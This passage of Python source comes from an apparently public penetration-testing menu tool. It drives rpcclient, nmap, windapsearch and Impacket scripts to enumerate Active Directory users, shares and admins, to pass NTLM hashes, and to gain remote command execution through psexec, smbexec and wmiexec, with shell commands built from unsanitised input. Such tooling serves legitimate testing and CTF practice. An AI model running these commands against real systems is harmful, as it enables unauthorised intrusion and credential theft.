               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("[" + colored("+", colour6) + "] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
            else:
               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("\n[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
               DOMC = 1  
# -----
            print("[" + colored("*", colour8) + "] Attempting to enumerate domain SID...")   
                     
            line2 = linecache.getline("lsaquery.tmp", 2)
            try:
               null,SID = line2.split(":")
            except ValueError:
               SID = "EMPTY"        
            SID = SID.lstrip(" ")          
            SID = spacePadding(SID, COL1)              
         
            if SID[:5] == "EMPTY":
               print("[" + colored("-", colour7) + "] Unable to enumerate domain SID...")
            else:
               print("[" + colored("+", colour6) + "] Found SID...\n")
               print(colored(SID,colour6) + "\n")         
# -----
            print("[" + colored("*", colour8) + "] Attempting to enumerate shares...")   
               
            if NTM[:5] != "EMPTY":
               print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
            else:
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
# -----
            errorCheck = linecache.getline("shares.tmp", 1)
  
            if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour0))
            else:
               for x in range(0, maxUser):
                  SHAR[x] = " "*COL2
# -----
               command("sed -i -n '/netname: /p' shares.tmp")
               command("sed -i '/^$/d' shares.tmp")
               command("cat shares.tmp | sort > sshares.tmp")
                        
               count = len(open('sshares.tmp').readlines())
            
               if count != 0:
                  print("[" + colored("+", colour6) + "] Found shares...\n")
                  with open("sshares.tmp") as read:
                     for x in range(0, count):
                        SHAR[x]  = read.readline()
                        SHAR[x] = SHAR[x].replace(" ","")
                        try:
                           null, SHAR[x] = SHAR[x].split(":")
                        except ValueError:
                           SHAR[x] = "Error..."
                        print(colored(SHAR[x].rstrip("\n"),colour6))
                        SHAR[x] = dotPadding(SHAR[x], COL2)
                     print("")                 
# -----
            print("[" + colored("*", colour8) + "] Attempting to enumerate domain users...")              

            if NTM[:5] != "EMPTY":
               print("[" + colored("i", colour2) + "] Using HASH value as password credential...")
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
            else:
               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
# -----
            errorCheck = linecache.getline("domusers.tmp", 1)

            if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
               print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour0))
            else:
               
               
               command("rm " + dataDir + "/usernames.txt")
               command("rm " + dataDir + "/hashes.txt")    
# -----
               command("sort domusers.tmp > sdomusers.tmp")
               command("sed -i '/^$/d' sdomusers.tmp")            
               count2 = len(open('sdomusers.tmp').readlines())               
# -----   
               if count2 != 0:
                  print ("[" + colored("+", colour6) + "] Found users...\n")
                  with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
                     for x in range(0, count2):
                        line = read.readline()
                        try:
                           null1,USER[x],null2 = line.split(":");
                        except ValueError:
                           USER[x] = "Error..."
                           
                        USER[x] = USER[x].replace("[","")
                        USER[x] = USER[x].replace("]","")
                        USER[x] = USER[x].replace("rid","")
                     
                        if USER[x][:5] != "Error":
                           USER[x] = spacePadding(USER[x], COL3)
                           HASH[x] = ""
                           HASH[x] = dotPadding(HASH[x], COL4)
                           
                           write1.write(USER[x].rstrip(" ") + "\n")
                           write2.write(HASH[x].rstrip(" ") + "\n")
                                                         
                           print(colored(USER[x],colour6))
               else:
                  print("[" + colored("-", colour7) + "] Unable to enumerate domain users...")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNS
      DNS = input("[" + colored("*", colour8) + "] Please enter DNSERVER IP address: ")

      if DNS == "":
         DNS = BAK
      else:
         DNS = spacePadding(DNS, COL1)
         if DNSC == 1:
            print("\n[+] Resetting current DNSERVER IP association...")
            command("sed -i '$d' /etc/resolv.conf")
            DNS = "EMPTY"
            DNS = spacePadding(DOM, COL1)
            DNSC = 0

         if DNS[:5] != "EMPTY":
            command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
            print("[" + colored("+", colour6) + "] DNSERVER IP " + DNS.rstrip(" ") + " has been added to /etc/resolv.conf...")
            DNSC = 1

         if":" in TIP:
            print("[" + colored("*", colour8) + "] Defaulting to IP 6...")
            IP46 = "-6"
         else:
            print("[" + colored("*", colour8) + "] Defualting to IP 4...")
            IP46 = "-4"            
      prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("[" + colored("*", colour8) + "] Please enter REMOTE IP address: ")

      if TIP == "":
         TIP = BAK
      else:
         TIP = spacePadding(TIP, COL1)
         if DOMC == 1:
            print("[" + colored("+", colour6) + "] Resetting current domain association...")
            command("sed -i '$d' /etc/hosts")
            DOM = "EMPTY"
            DOM = spacePadding(DOM, COL1)
            DOMC = 0

         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[" + colored("+", colour6) + "] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         
         if ":" in TIP:
            print("[" + colored("+", colour6) + "] Defaulting to IP 6...")
            IP46 = "-6"
         else:
            print("[" + colored("+", colour6) + "] Defualting to IP 4...")
            IP46 = "-4"
            
         print("[" + colored("*", colour8) + "] Checking network interfaces...\n")
         try:      
            authLevel = RPC_C_AUTHN_LEVEL_NONE
            stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")
            rpctransport = transport.DCERPCTransportFactory(stringBinding)
            portmap = rpctransport.get_dce_rpc()
            portmap.set_auth_level(authLevel)
            portmap.connect()
            objExporter = IObjectExporter(portmap)
            bindings = objExporter.ServerAlive2()         

            for binding in bindings:
               NetworkAddr = binding['aNetworkAddr']
               print(colored("Address: " + NetworkAddr, colour6))
         except:
            print(colored("[!] WARNING!!! - Unable to enumerate network interfaces, check connection...", colour0))
                                       
         prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      print("[" + colored("i", colour2) + "] Current live port listing: " + PTS)
      BAK = POR
      POR = input("[" + colored("*", colour8) + "] Please enter PORT numbers: ")

      if POR != "":
         PTS = POR
         POR = spacePadding(POR, COL1)
      else:
         POR = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the web address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = WEB
      WEB = input("[" + colored("*", colour8) + "] Please enter the web address: ")

      if WEB != "":
         WEB = spacePadding(WEB, COL1)
      else:
         WEB = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = USR
      USR = input("[" + colored("*", colour8) + "] Please enter USERNAME: ")

      if USR == "":
         USR = BAK
      else:
         USR = spacePadding(USR, COL1)
         NTM = "EMPTY"
         for x in range(0, maxUser):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               NTM = HASH[x]
         NTM = spacePadding(NTM, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = PAS
      PAS = input("[" + colored("*", colour8) + "] Please enter PASSWORD: ")

      if PAS == "":
         PAS = BAK
      else:
         PAS = spacePadding(PAS, COL1)
         NTM = spacePadding("EMPTY", COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = NTM
      NTM = input("[" + colored("*", colour8) + "] Please enter HASH value: ")

      if NTM != "":
         NTM = spacePadding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = DOM
      DOM = input("[" + colored("*", colour8) + "] Please enter DOMAIN name: ")

      if DOM != "":
         DOM = spacePadding(DOM, COL1)
         if DOMC == 1:
            print("[" + colored("+", colour6) + "] Removing previous domain name from /etc/hosts...")
            command("sed -i '$d' /etc/hosts")
         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[" + colored("+", colour6) + "] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         prompt()
      else:
         DOM = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = SID
      SID = input("[" + colored("*", colour8) + "] Please enter DOMAIN SID value: ")

      if SID != "":
         SID = spacePadding(SID, COL1)
      else:
         SID = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = TSH
      TSH = input("[" + colored("*", colour8) + "] Please enter SHARE name: ")

      if TSH != "":
         TSH = spacePadding(TSH,COL1)
      else:
         TSH = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = LTM
      LTM = input("[" + colored("*", colour8) + "] Please enter computer TIME: ")

      if LTM != "":
         command("date --set=" + LTM)
         LTM = spacePadding(LTM, COL1)
         SKEW = 1
      else:
         LTM = BAK      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      oldDirectory = DIR.rstrip(" ")     
      newDirectory = input("[" + colored("*", colour8) + "] Please enter new WORK FOLDER: ").upper()

      if os.path.exists(newDirectory):
         print("[" + colored("-", colour7) + "] Directory already exists....")
      else:
         if len(newDirectory) > 0:
            os.mkdir(newDirectory)
            DIR = newDirectory
            
            DIR = spacePadding(DIR, COL1)
            print("[" + colored("+", colour6) + "] Working directory changed...")
            print("[" + colored("*", colour8) + "] Checking to see if the old directory can be safely deleted...")
            
            if len(os.listdir(oldDirectory)) == 0:
               os.rmdir(oldDirectory)
               print("[" + colored("+", colour6) + "] Old directory succesfully deleted...")
            else:
               print("[" + colored("-", colour7) + "] Old directory still contains data...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ping localhost IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      checkParams = testOne()
      
      if checkParams != 1:
         print("[" + colored("+", colour6) + "] Checking connection...\n")
         command("ping -c 5 "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - fierce -dns DNS SERVER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      if DNS[:5] != "EMPTY":
         command("fierce -dns " + DNS.rstrip(" "))
      else:
         print("[" + colored("-", colour7) + "] DNS server has not been specified...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      checkParams = testTwo()
               
      if USR[:2] == "''":
         print("\n[-] Username has not been specified...")
         checkParams = 1
         
      if PAS[:2] == "''":
         print("\n[-] Password has not been specified...")
         checkParams = 1

      if checkParams != 1:
         command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
         command("sed -i '1d' records.csv")
         command("\ncat records.csv")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      checkParams = testOne()
      
      if checkParams != 1:
            print("[" + colored("*", colour8) + "] Attempting to enumerate live ports, please wait as this can take sometime...")
            command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
            PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
            POR = spacePadding(PTS, COL1)

            if POR[:1] == "":
               print("[" + colored("-", colour7) + "] Unable to enumerate any port information, good luck!!...")
            else:
               print("[" + colored("+", colour6) + "] Found live ports...\n")
               print(colored(PTS,colour6))
        
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      checkParams = testOne()
  
      if checkParams != 1:
         if POR[:5] != "EMPTY":
            print("[" + colored("*", colour8) + "] Scanning specified live ports only, please wait...")
            command("nmap " + IP46 + " -p " + POR.rstrip(" ") + " -sC -sV " + TIP.rstrip(" "))
         else:
            print("[" + colored("*", colour8) + "] Fast scanning all ports, please wait...")
            command("nmap " + IP46 + " -T4 -F " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      checkParams = testTwo()

      if checkParams != 1:
         command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap IP46 -sU -O -p 123 --script ntp-info IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      checkParams = testOne()

      if checkParams != 1:
#         command("nmap " + IP46 + " -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getArch.py target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      checkParams = testOne()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Attempting to enumerate architecture...")
         command(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")
         OS = "[" + colored("-", colour7) + "] Unable to identify architecture..."
         with open("os.tmp") as read:
            for line in read:
               if "is" in line:
                  print("[" + colored("+", colour6) + "] Found architecture...")
                  OS = line
         read.close()
         print(colored(OS,colour6))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='21':
      checkParams = testTwo()

      if checkParams != 1:
         command(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      checkParams = testTwo()

      if checkParams != 1:
         command(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      checkParams = testTwo()

      if checkParams != 1:
         command(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      checkParams = testTwo()
         
      if checkParams != 1:
         command(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      checkParams = testTwo()
         
      if checkParams != 1:
            command(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      checkParams = testTwo()
      
      if checkParams != 1:
         command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      checkParams = testTwo()

      if checkParams != 1:
         command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ifmap.py IP 135.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      checkParams = testOne()
      if checkParams != 1:
         command(keyPath + "ifmap.py " + TIP.rstrip(" ") + " 135")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      checkParams = testOne()
      
      if checkParams != 1:
         ifmap = input("[" + colored("*", colour8) + "] Please enter MSRPC interface (ifmap) : ")    
         ifmap = ifmap.replace("v",'')
         ifmap = ifmap .replace(":",'')
         
         command(keyPath + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='30':
      checkParams = testTwo()
      
      if IP46 == "-6":
         print(colored("[!] WARNING!! Not comptable with IP 6...", colour0))

      if checkParams != 1:
      
         print("[" + colored("*", colour8) + "] Enumerating DNS zones...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
      
         print("\n[*] Enumerating domain admins...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")         
         
         print("\n[*] Enumerating admin protected objects...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                  
         
         print("\n[*] Enumerating domain users...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")
         
         print("\n[*] Enumerating remote management users...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")         
         
         print("\n[*] Enumerating users with unconstrained delegation...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
         
         print("\n[*] Enumerating domain groups...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")
         
         print("\n[*] Enumerating AD computers...")
         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
         
#        command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt")         
         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      checkParams = testTwo()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Enumerating, please wait....")
         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > domain.tmp")         
         
         command("cat domain.tmp | grep 'Domain SID' > sid.tmp")
         
         with open("sid.tmp", "r") as read:
            line1 =  read.readline()
         read.close()
         
         if line1 != "":
            if SID[:5] == "EMPTY":
               SID = line1.replace('[*] Domain SID is: ',"")
               print("[" + colored("+", colour6) + "] Domain SID found...\n")
               command("echo " + SID + "\n")
         if SID[:5] == "EMPTY":
            print("[" + colored("-", colour7) + "] Unable to find domain SID...")
         
         command("sed -i /*/d domain.tmp")
         command("sed -i 's/.*://g' domain.tmp")   
         command("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
         command("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
         command("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")
         
         command("sed -i 's/(SidTypeAlias)//g' alias.tmp")
         command("sed -i 's/(SidTypeGroup)//g' group.tmp")
         command("sed -i 's/(SidTypeUser)//g'  users.tmp")
         
         if os.path.getsize("alias.tmp") != 0:
            print("[" + colored("+", colour6) + "] Found Aliases...\n")
            command("tput setaf 2; tput bold")
            command("cat alias.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[" + colored("-", colour7) + "] Unable to find aliases...")
            
         if os.path.getsize("group.tmp") != 0:
            print("\n[+] Found Groups...\n")
            command("tput setaf 2; tput bold")
            command("cat group.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[" + colored("-", colour7) + "] Unable to find groups...")
            
         if os.path.getsize("users.tmp") != 0:
            print("\n[+] Found Users...\n")
            command("tput setaf 2; tput bold")
            command("cat users.tmp")  
            command("tput sgr0; tput dim")
         else:
            print("[" + colored("-", colour7) + "] Unable to find usernames...")
         
         if os.path.getsize("users.tmp") != 0:
            command("rm " + dataDir + "/usernames.txt")				# PURGE OLD FILE
         
            with open("users.tmp", "r") as read:
               for x in range(0, maxUser):
                  line1 = read.readline()                  
                  if line1 != "":
                     try:
                        null,USER[x] = line1.split(DOM.rstrip(" ") + "\\")
                     except ValueError:
                        USER[x] = "Error..."
                     USER[x] = spacePadding(USER[x], COL3)
                     command("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                  else:
                     USER[x] = " "*COL3
            read.close()      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      checkParams = testTwo()

      if checkParams != 1:
         print("[" + colored("*", colour8) + "] Enumerating users, please wait this can take sometime...")
         
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using HASH value as password authentication...\n")
            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
         else:
            print("")
            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")
                           
         count = os.path.getsize("users.tmp")
         
         if count == 0:
            print("[" + colored("-", colour7) + "] File users.tmp is empty...")
            checkParams = 1
         
         with open("users.tmp", "r") as read:
            for x in range(0, count):
               line = read.readline()
               if "[" + colored("-", colour7) + "] SMB SessionError:" in line:
                  checkParams = 1
                  command("cat users.tmp")
                  break
         read.close()
        
         if checkParams != 1:
            command("rm " + dataDir + "/usernames.txt")          
            command("rm " + dataDir + "/hashes.txt")                        
            command("touch " + dataDir + "/hashes.txt")
            
            
            command("rm tokens.txt")
            command("touch tokens.txt")      
                          
